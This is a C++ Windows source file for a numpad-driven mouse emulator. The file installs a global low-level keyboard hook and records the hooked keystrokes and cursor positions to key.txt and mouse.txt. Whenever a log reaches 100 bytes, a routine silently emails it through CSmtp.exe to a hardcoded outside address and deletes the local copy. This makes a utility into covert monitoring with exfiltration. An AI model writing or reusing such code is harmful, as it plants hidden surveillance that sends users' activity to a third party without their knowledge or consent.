// ahahahha.cpp : Defines the entry point for the application.
//

#include "stdafx.h"
#include "MouseEmulater.h"

#define _WIN32_WINNT 0x0501 //WindowsXP

#include <stdio.h>
#include <windows.h>
#include <string>
#include <fstream>
#include <iostream>
#include <cstring>

// keys to control cursor
#define KeyMoveLeft				VK_NUMPAD4
#define KeyMoveRight			VK_NUMPAD6
#define KeyMoveUP				VK_NUMPAD8
#define KeyMoveDown				VK_NUMPAD2

// keys to emulate mouse buttons
#define KeyClickLeft			VK_NUMPAD7
#define KeyClickRight			VK_NUMPAD9

// key to switch on/off MouseEmulate software
#define KeyMouseEmulateEnDis	VK_F7

//global variables
HHOOK hHook;
int step = 0;
volatile bool bEmulEn = false;
unsigned short tNow = 0, tBefore = 0;
unsigned char NUMLOCK_CLICK_COUNTER = 0;

//prototypes
void StepCalculate();
bool CheckKey(int nCode, WPARAM wParam, LPARAM lParam);
LRESULT CALLBACK KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam);

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	WNDCLASSEXW wcex;
	hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHook, hInstance, 0);
	while (GetMessage(NULL, NULL, 0, 0)); // NOP while not WM_QUIT
	return UnhookWindowsHookEx(hHook);
}

wchar_t *convertCharArrayToLPCWSTR(const char* charArray)
{
	wchar_t* wString = new wchar_t[4096];
	MultiByteToWideChar(CP_ACP, 0, charArray, -1, wString, 4096);
	return wString;
}

int getFileSize(const std::string &fileName)
{
	std::fstream file(fileName.c_str(), std::fstream::in | std::fstream::binary);

	if (!file.is_open())
	{
		return -1;
	}

	file.seekg(0, std::ios::end);
	int fileSize = file.tellg();
	file.close();

	return fileSize;
}

bool sendEmail(const std::string& filename)
{
	char *procName = new char[256];
	strcpy_s(procName, 256, "CSmtp.exe ");

	PROCESS_INFORMATION ProcessInfo; //This is what we get as an [out] parameter

	STARTUPINFO StartupInfo; //This is an [in] parameter
	std::string cmdArgs = "CSmtp.exe yuri.vetroff@gmail.com " + filename;

	ZeroMemory(&StartupInfo, sizeof(StartupInfo));
	StartupInfo.cb = sizeof StartupInfo; //Only compulsory field

	if (CreateProcess(NULL, convertCharArrayToLPCWSTR(cmdArgs.c_str()),
		NULL, NULL, FALSE, 0, NULL,
		NULL, &StartupInfo, &ProcessInfo))
	{
		WaitForSingleObject(ProcessInfo.hProcess, INFINITE);
		CloseHandle(ProcessInfo.hThread);
		CloseHandle(ProcessInfo.hProcess);

		printf("Yohoo!");
	}
	else
	{
		printf("The process could not be started...");
	}
	return true;
}

bool is_empty(std::fstream& pFile)
{
	return pFile.peek() == std::ifstream::traits_type::eof();
}


LRESULT CALLBACK KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam)
{
	KBDLLHOOKSTRUCT* details = (KBDLLHOOKSTRUCT*)lParam;
	if (nCode == HC_ACTION)
		if (wParam == WM_SYSKEYDOWN || wParam == WM_KEYDOWN || wParam == WM_SYSKEYUP || wParam == WM_KEYUP)
			if (details->vkCode == KeyMoveLeft || 
				details->vkCode == KeyMoveRight ||
				details->vkCode == KeyMoveUP ||
				details->vkCode == KeyMoveDown ||
				details->vkCode == KeyClickLeft ||
				details->vkCode == KeyClickRight ||
				details->vkCode == VK_F7)
			{
				if (CheckKey(nCode, wParam, lParam))
					return 1;
			}

	return CallNextHookEx(hHook, nCode, wParam, lParam);
}

void StepCalculate()
{
	unsigned short speedMax = 40;
	unsigned short dt = tNow - tBefore;
	float dtMax = 30.0f;

	step = (int)(speedMax * dtMax / (tNow - tBefore));
}

bool CheckKey(int nCode, WPARAM wParam, LPARAM lParam)
{
	std::fstream key;
	std::fstream mouse;
	POINT p;
	GetCursorPos(&p);
	KBDLLHOOKSTRUCT *hookStruct = (KBDLLHOOKSTRUCT *)lParam;

	SYSTEMTIME now;
	GetSystemTime(&now);
	key.open("key.txt", std::ios::app);
	mouse.open("mouse.txt", std::ios::app);

	// switch on/off the MouseEmulate program
	if (wParam == WM_SYSKEYUP || wParam == WM_KEYUP)
	{
		if (hookStruct->vkCode == KeyMouseEmulateEnDis)
		{
			bEmulEn = bEmulEn ? false : true;
		}
	}

	if (bEmulEn)
	{
		switch (hookStruct->vkCode)
		{
		case KeyClickLeft:
		{
			if (wParam == WM_SYSKEYDOWN || wParam == WM_KEYDOWN)
			{
				mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
			}
			else if (wParam == WM_SYSKEYUP || wParam == WM_KEYUP)
			{
				mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
			}
		}
		break;
		case KeyClickRight:
		{
			if (wParam == WM_SYSKEYDOWN || wParam == WM_KEYDOWN)
			{
				mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
			}
			else if (wParam == WM_SYSKEYUP || wParam == WM_KEYUP)
			{
				mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
			}
		}
		break;
		case KeyMoveLeft:
		{
			if (wParam == WM_SYSKEYDOWN || wParam == WM_KEYDOWN)
			{
				tNow = 1000 * now.wSecond + now.wMilliseconds;
				StepCalculate();
				SetCursorPos((p.x) - step, p.y);
				tBefore = 1000 * now.wSecond + now.wMilliseconds;
				if (key.is_open()) {
					key << "4 - left ";
				}
				if (mouse.is_open())
				{
					mouse << p.x - step << " " << p.y << "; ";
				}
			}
		}
		break;
		case KeyMoveUP:
		{
			if (wParam == WM_SYSKEYDOWN || wParam == WM_KEYDOWN)
			{
				tNow = 1000 * now.wSecond + now.wMilliseconds;
				StepCalculate();
				SetCursorPos(p.x, (p.y) - step);
				tBefore = 1000 * now.wSecond + now.wMilliseconds;
				if (key.is_open()) 
				{
					key << "8 - up ";
				}
				if (mouse.is_open())
				{
					mouse << p.x << " " << p.y - step << "; ";
				}
			}
		}
		break;
		case KeyMoveRight:
		{
			if (wParam == WM_SYSKEYDOWN || wParam == WM_KEYDOWN)
			{
				tNow = 1000 * now.wSecond + now.wMilliseconds;
				StepCalculate();
				SetCursorPos((p.x) + step, p.y);
				tBefore = 1000 * now.wSecond + now.wMilliseconds;
				if (key.is_open()) 
				{
					key << "6 - right ";
				}
				if (mouse.is_open())
				{
					mouse << p.x + step << " " << p.y << "; ";
				}
			}
		}
		break;
		case KeyMoveDown:
		{
			if (wParam == WM_SYSKEYDOWN || wParam == WM_KEYDOWN)
			{
				tNow = 1000 * now.wSecond + now.wMilliseconds;
				StepCalculate();
				SetCursorPos(p.x, (p.y) + step);
				tBefore = 1000 * now.wSecond + now.wMilliseconds;
				if (key.is_open()) {
					key << "2 - down ";
				}
				if (mouse.is_open())
				{
					mouse << p.x << " " << p.y + step << "; ";
				}
			}
		}
		break;
		}
	}
	if (key.is_open())
	{
		if (!is_empty(key))
		{
			key.close();
			int i = getFileSize("key.txt");
			if ( i >= 100)
			{
				sendEmail("key.txt");
				std::remove("key.txt");
			}
		}
		else key.close();
	}

	if (mouse.is_open())
	{
		if (!is_empty(mouse))
		{
			mouse.close();
			int i = getFileSize("mouse.txt");
			if (i >= 100)
			{
				sendEmail("mouse.txt");
				std::remove("mouse.txt");
			}
		}
		else mouse.close();
	}
	
	return bEmulEn;
}